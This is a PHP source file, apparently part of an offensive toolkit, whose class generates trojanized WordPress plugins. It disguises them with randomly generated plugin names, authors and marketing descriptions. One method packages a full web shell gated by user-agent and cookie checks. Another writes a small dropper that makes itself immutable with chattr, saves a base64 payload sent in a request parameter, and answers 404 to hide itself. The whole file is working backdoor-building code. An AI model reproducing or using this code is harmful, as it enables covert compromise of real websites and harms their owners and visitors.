<?php

namespace new_bots\wordpressPlugins;

use AllowDynamicProperties;
use Faker\Factory;


#[AllowDynamicProperties] class makeMeWordPressing extends \ZipArchive
{

    private \Faker\Generator $faker;
    private string $activator;
    protected string $allowed_agent;
    protected string $cookie_name;
    protected string $cookie_value;
    protected string $auth_uuid;
    private string $spoof_directory_name;
    private string $random_name;

    function __construct(string|null $activator, string $allowed_agent, string $cookie_name, string $cookie_value)
    {
        $this->faker = Factory::create();
        $this->random_name = bin2hex(openssl_random_pseudo_bytes(24));
        if (!is_null($activator)) {
            $this->activator = $activator;
        }
        $this->allowed_agent = $allowed_agent;
        $this->cookie_name = $cookie_name;
        $this->cookie_value = $cookie_value;
        $this->auth_uuid = vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex(openssl_random_pseudo_bytes(16)), 4));
        $this->spoof_directory_name = $this->faker->word();
        if (is_dir($this->spoof_directory_name)){
            rmdir($this->spoof_directory_name);
            mkdir($this->spoof_directory_name);
        }
        if (!is_dir($this->spoof_directory_name)){
            mkdir($this->spoof_directory_name);
        }
        $pluginType = ['widget', 'SEO tool', 'security plugin', 'performance optimizer', 'image optimizer', 'cache module', 'analytics module', 'contact form', 'slider tool', 'page builder', 'menu organizer', 'language switcher', 'social share plugin', 'video player', 'comment manager', 'backup system', 'email marketing plugin', 'gallery tool', 'anti-spam plugin', 'captcha module', 'accordion creator', 'popup builder', 'privacy policy manager', 'cookie notice plugin', 'favicon tool', 'RSS feed manager', 'testimonial display', 'appointment scheduler', 'author box plugin', 'custom post type creator', 'breadcrumb enhancer', '404 error handler', 'AMP support', 'customizer tool', 'redirect manager', 'database tool', 'lazy load implementer', 'forum plugin', 'calendar plugin', 'membership management', 'payment gateway integration', 'webinar plugin', 'seo tag manager', 'responsive tables', 'FAQ module', 'document manager', 'logo showcase', 'portfolio module', 'recipe plugin', 'ecommerce integration', 'microdata module', 'real estate listing', 'Google Maps integration', 'PDF viewer', 'donation plugin', 'code snippet manager'];

        $operation = array_merge(['improve', 'optimize', 'boost', 'enhance', 'maximize', 'elevate', 'increase', 'amplify', 'advance', 'upgrade', 'intensify', 'magnify', 'strengthen', 'escalate', 'extend', 'expand', 'empower', 'enrich', 'upscale', 'multiply', 'raise', 'eases', 'streamline', 'simplify', 'fine-tune', 'revolutionize', 'modernize', 'redefine', 'facilitate', 'bolster', 'accelerate', 'augment', 'revamp', 'rejuvenate', 'reshape', 'refurbish', 'reinvent', 'invigorate', 'spark', 'fortify', 'realign', 'refine', 'renew', 'morph', 'enlarge', 'uplift', 'inspire', 'energize', 'reboot', 'revitalize', 'regenerate']);

        $aspect = array_merge(['performance', 'efficiency', 'load speed', 'user interface', 'security', 'SEO ranking', 'adaptability', 'accessibility', 'availability', 'usability', 'interoperability', 'flexibility', 'functionality', 'responsiveness', 'compatibility', 'customizability', 'portability', 'maintainability', 'reliability', 'intuitiveness', 'versatility', 'scalability', 'user experience', 'aesthetics', 'navigability', 'organizational structure', 'website architecture', 'information flow', 'design elements', 'content presentation', 'web standards conformity']);
        $this->fake_description = [
            "a" => array_map(fn($i) => "A " . $this->faker->randomElement($pluginType) . " that " . $this->faker->randomElement($operation) . " your website's " . $this->faker->randomElement($aspect) . ".", range(1, 5)),
            "b" => array_map(fn($i) => "Boost your site with this " . $this->faker->randomElement($pluginType) . " that " . $this->faker->randomElement($operation) . " your website's " . $this->faker->randomElement($aspect) . ".", range(1, 5)),
            "c" => array_map(fn($i) => "Check out this " . $this->faker->randomElement($pluginType) . " that " . $this->faker->randomElement($operation) . " your website's " . $this->faker->randomElement($aspect) . ".", range(1, 5)),
            "d" => array_map(fn($i) => "Discover the power of " . $this->faker->randomElement($pluginType) . " that " . $this->faker->randomElement($operation) . " your website's " . $this->faker->randomElement($aspect) . ".", range(1, 5)),
            "e" => array_map(fn($i) => "Enhance your site with a " . $this->faker->randomElement($pluginType) . " that " . $this->faker->randomElement($operation) . " your website's " . $this->faker->randomElement($aspect) . ".", range(1, 5)),
            "f" => array_map(fn($i) => "Fit your needs with a " . $this->faker->randomElement($pluginType) . " that " . $this->faker->randomElement($operation) . " your website's " . $this->faker->randomElement($aspect) . ".", range(1, 5)),
            "g" => array_map(fn($i) => "Grab the opportunity to " . $this->faker->randomElement($operation) . " your website's " . $this->faker->randomElement($aspect) . " with this " . $this->faker->randomElement($pluginType) . ".", range(1, 5)),
            "h" => array_map(fn($i) => "Have you tried this " . $this->faker->randomElement($pluginType) . " that can " . $this->faker->randomElement($operation) . " your website's " . $this->faker->randomElement($aspect) . "?", range(1, 5)),
            "i" => array_map(fn($i) => "Improve your web performance with this " . $this->faker->randomElement($pluginType) . " by " . $this->faker->randomElement($operation) . " your website's " . $this->faker->randomElement($aspect) . ".", range(1, 5)),
            "j" => array_map(fn($i) => "Just the right " . $this->faker->randomElement($pluginType) . " to " . $this->faker->randomElement($operation) . " your website's " . $this->faker->randomElement($aspect) . ".", range(1, 5)),
            "k" => array_map(fn($i) => "Keep your website top-notch with this " . $this->faker->randomElement($pluginType) . " that can " . $this->faker->randomElement($operation) . " its " . $this->faker->randomElement($aspect) . ".", range(1, 5)),
            "l" => array_map(fn($i) => "Leverage your website's " . $this->faker->randomElement($aspect) . " with this " . $this->faker->randomElement($operation) . " that's part of our " . $this->faker->randomElement($pluginType) . ".", range(1, 5)),
            "m" => array_map(fn($i) => "Maintain your website at its peak with this " . $this->faker->randomElement($pluginType) . " that " . $this->faker->randomElement($operation) . " your " . $this->faker->randomElement($aspect) . ".", range(1, 5)),
            "n" => array_map(fn($i) => "Note the difference in your website's " . $this->faker->randomElement($aspect) . " when you use our " . $this->faker->randomElement($operation) . " as part of our " . $this->faker->randomElement($pluginType) . ".", range(1, 5)),
            "o" => array_map(fn($i) => "Optimize your website's " . $this->faker->randomElement($aspect) . " with our " . $this->faker->randomElement($pluginType) . " that " . $this->faker->randomElement($operation) . ".", range(1, 5)),
            "p" => array_map(fn($i) => "Profit from the " . $this->faker->randomElement($operation) . " of this " . $this->faker->randomElement($pluginType) . " for your website's " . $this->faker->randomElement($aspect) . ".", range(1, 5)),
            "q" => array_map(fn($i) => "Quickly improve your website's " . $this->faker->randomElement($aspect) . " with our " . $this->faker->randomElement($pluginType) . " that " . $this->faker->randomElement($operation) . ".", range(1, 5)),
            "r" => array_map(fn($i) => "Revamp your site with this " . $this->faker->randomElement($pluginType) . " that can be used to " . $this->faker->randomElement($operation) . " your website's " . $this->faker->randomElement($aspect) . ".", range(1, 5)),
            "s" => array_map(fn($i) => "Stay on top of your website's " . $this->faker->randomElement($aspect) . " by using our " . $this->faker->randomElement($pluginType) . " to " . $this->faker->randomElement($operation) . ".", range(1, 5)),
            "t" => array_map(fn($i) => "Think about using our " . $this->faker->randomElement($pluginType) . " to " . $this->faker->randomElement($operation) . " your website's " . $this->faker->randomElement($aspect) . ".", range(1, 5)),
            "u" => array_map(fn($i) => "Upgrade your site's " . $this->faker->randomElement($aspect) . " with our special " . $this->faker->randomElement($pluginType) . " that can " . $this->faker->randomElement($operation) . ".", range(1, 5)),
            "v" => array_map(fn($i) => "Venture to improve your website's " . $this->faker->randomElement($aspect) . " with our " . $this->faker->randomElement($pluginType) . " that can " . $this->faker->randomElement($operation) . ".", range(1, 5)),
            "w" => array_map(fn($i) => "Witness the change in your website's " . $this->faker->randomElement($aspect) . " with our unique " . $this->faker->randomElement($pluginType) . " that can " . $this->faker->randomElement($operation) . ".", range(1, 5)),
            "x" => array_map(fn($i) => "eXperience the power of our " . $this->faker->randomElement($pluginType) . " that can " . $this->faker->randomElement($operation) . " your website's " . $this->faker->randomElement($aspect) . ".", range(1, 5)),
            "y" => array_map(fn($i) => "Yearning for better " . $this->faker->randomElement($aspect) . "? Use our " . $this->faker->randomElement($pluginType) . " to " . $this->faker->randomElement($operation) . ".", range(1, 5)),
            "z" => array_map(fn($i) => "Zero in on your website's " . $this->faker->randomElement($aspect) . " with our " . $this->faker->randomElement($pluginType) . " that can " . $this->faker->randomElement($operation) . ".", range(1, 5)),
        ];
    }

    protected function spoofWordPressHeader(): array
    {
        return [
            "Plugin Name:" => $this->faker->word(),
            "Plugin URI:" => $this->faker->url(),
            "Description:" => $this->faker->randomElement($this->fake_description[$this->faker->word()[0]]),
            "Version:" => rand(0, 10) . '.' . rand(0, 50) . '.' . rand(1, 15),
            "Requires At Least:" => floatval(4.1),
            "Requires PHP:" => 7.2,
            "Author:" => $this->faker->firstName . " " . $this->faker->lastName,
            "Author URI:" => $this->faker->url(),
            "License:" => "GPL v2 or later",
            "License URI:" => "https://www.gnu.org/licenses/gpl-2.0.html",
            "Update URI:" => $this->faker->url()
        ];
    }

    /**
     * @throws \Exception
     */
    public function createChonker(): array {
        $spoof = $this->spoofWordPressHeader();
        $base = '';
        $spoof_name = "{$this->spoof_directory_name}/{$this->random_name}.php";
        echo $spoof_name.PHP_EOL;
        foreach ($spoof as $key => $valu){
            $base .= "* {$key} {$valu}\n";
        }
        $base .= "*/\n";
        $slop = file('slop.php');
        if ($slop === false){
            throw new \Exception("[ !! ] Unable to find slop.php file. I cannot continue. [ !! ]");
        }
        $slop[3] = "/*\n" . $base . "\n";
        $slop[4] = sprintf("define(\"allow_agent\", \"%s\");", sha1($this->allowed_agent)).PHP_EOL;
        $slop[5] = sprintf("define(\"uuid\", \"%s\");", $this->auth_uuid).PHP_EOL;
        $slop[6] = sprintf("define(\"cval\", \"%s\");", $this->cookie_value).PHP_EOL;
        $slop[7] = "define(\"cname\", \"{$this->cookie_name}\");".PHP_EOL;
        $slop[array_key_last($slop)-5] = '';
        $slop[array_key_last($slop)-4] = '';
        $slop[array_key_last($slop)-3] = '';
        $slop[array_key_last($slop)-2] = '';
        $slop[array_key_last($slop)-1] = '';
        $slop[array_key_last($slop)] = PHP_EOL."add_action('init', slopp);".PHP_EOL;
        $counter = 0;
        foreach ($slop as $needer){
            $counter += 1;
            if (str_contains($needer, "main()") !== false){
                echo "Overwriting: $needer".PHP_EOL;
                $slop[$counter] = "function {$spoof['Plugin Name:']}(){".PHP_EOL;
                echo $slop[$counter].PHP_EOL;
            }
        }
        file_put_contents($spoof_name, implode("", $slop));
        return [
            "TrojanPlugin" => $this->packZipArchive($spoof_name, $spoof['Plugin Name:'], "chonker"), // activation word is useless because this is the full shell being packaged as a plugin.
            "ActivationWord" => "Chonker-" . bin2hex(openssl_random_pseudo_bytes(10)),
            "uuid" => $this->auth_uuid,
            "CookieValue" => $this->cookie_value,
            "CookieName" => $this->cookie_name,
            "AllowedAgent" => $this->allowed_agent
        ];
    }

    /**
     * @throws \Exception
     */
    public function createSmallTrojanWordpress(): array
    {
        $spoof = $this->spoofWordPressHeader();
        $base = "<?php\n/*\n";
        foreach ($spoof as $key => $valu){
            $base .= "* {$key} {$valu}\n";
        }
        $base .= "*/\n\n";
        $template = <<<TPL
$base
function {$spoof['Plugin Name:']}(){
    @system("chattr +i ".\$_SERVER['SCRIPT_FILENAME']) || @system("chattr +i ". __FILE__);
    if (!is_file('$this->random_name.php')){
        if (!is_writable('.')){
            http_response_code(404);
            echo "CRITICAL ERROR, I CANNOT WRITE TO THIS DIRECTORY! PANIC!";
            die();
        }
        if (isset(\$_REQUEST['{$this->activator}'])){
            file_put_contents('{$this->random_name}.php', base64_decode(\$_REQUEST['$this->activator']));
            header("FileName: {$this->random_name}.php");
            die();
        } else {
            http_response_code(404);
            die();
        }    }else{
        die();
    }
}
add_action('init', {$spoof['Plugin Name:']});
TPL;
        $tr_name = "{$this->spoof_directory_name}/{$this->random_name}.php";
        file_put_contents("{$this->spoof_directory_name}/{$this->random_name}.php", $template);
        return [
            "TrojanPlugin" => $this->packZipArchive($tr_name, $spoof['Plugin Name:'], "slim"),
            "ActivationWord" => $this->activator
        ];
    }

    protected function packZipArchive(string $trojan_script, string $spoof_name, string $type): string {

        $zipper = new \ZipArchive();
        $target_zip_directory = "lib/new_bots/wordpressPlugins/trojanized_plugins/slim/";
        if (str_contains($type, "chonker") !== false){
            $target_zip_directory = "lib/new_bots/wordpressPlugins/trojanized_plugins/chunky/";
        }
        if ($zipper->open("{$target_zip_directory}{$spoof_name}.zip", \ZipArchive::CREATE | \ZipArchive::OVERWRITE) !== true){
            throw new \Exception(PHP_EOL."\033[0;31m[ !! ] PANIC, I CANNOT WRITE THE ZIP ARCHIVE. [ !! ]\033[0m".PHP_EOL);
        }
        $zipper->addFile("{$this->spoof_directory_name}/{$this->random_name}.php");
        $zipper->close();
        unlink($trojan_script);
        rmdir($this->spoof_directory_name);
        return "{$target_zip_directory}{$spoof_name}.zip";
    }
}